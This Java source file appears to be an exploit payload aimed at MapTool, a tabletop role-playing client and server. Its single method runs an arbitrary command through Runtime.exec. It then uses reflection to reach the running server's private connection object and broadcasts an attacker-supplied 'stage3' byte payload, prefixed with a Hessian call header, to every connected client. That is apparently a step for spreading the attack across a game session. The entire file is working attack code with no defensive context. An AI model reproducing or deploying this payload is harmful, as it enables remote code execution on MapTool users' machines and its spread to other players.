package fyi.catnip;

import java.lang.reflect.Field;

public class Payload {
    public static void memes(String cmd, byte[] stage3) {
        System.out.println("yeet");
        try {
            Runtime.getRuntime().exec(cmd);
            if(stage3 != null) {
                byte[] hessian_call = new byte[] {'c', 0, 0, 'H', 0, 0};
                byte[] payload = new byte[hessian_call.length + stage3.length];
                System.arraycopy(hessian_call, 0, payload, 0, hessian_call.length);
                System.arraycopy(stage3, 0, payload, hessian_call.length, stage3.length);

                Field srv_field = Class
                    .forName("net.rptools.maptool.client.MapTool")
                    .getDeclaredField("server");
                srv_field.setAccessible(true);
                Object srv = srv_field.get(null);

                Field conn_field = Class
                    .forName("net.rptools.maptool.server.MapToolServer")
                    .getDeclaredField("conn");

                conn_field.setAccessible(true);
                Object conn = conn_field.get(srv);

                Class
                    .forName("net.rptools.clientserver.simple.server.ServerConnection")
                    .getMethod("broadcastMessage", byte[].class)
                    .invoke(conn, (Object) payload);
            }
        }
        catch (Throwable e) { e.printStackTrace(); }
    }
}
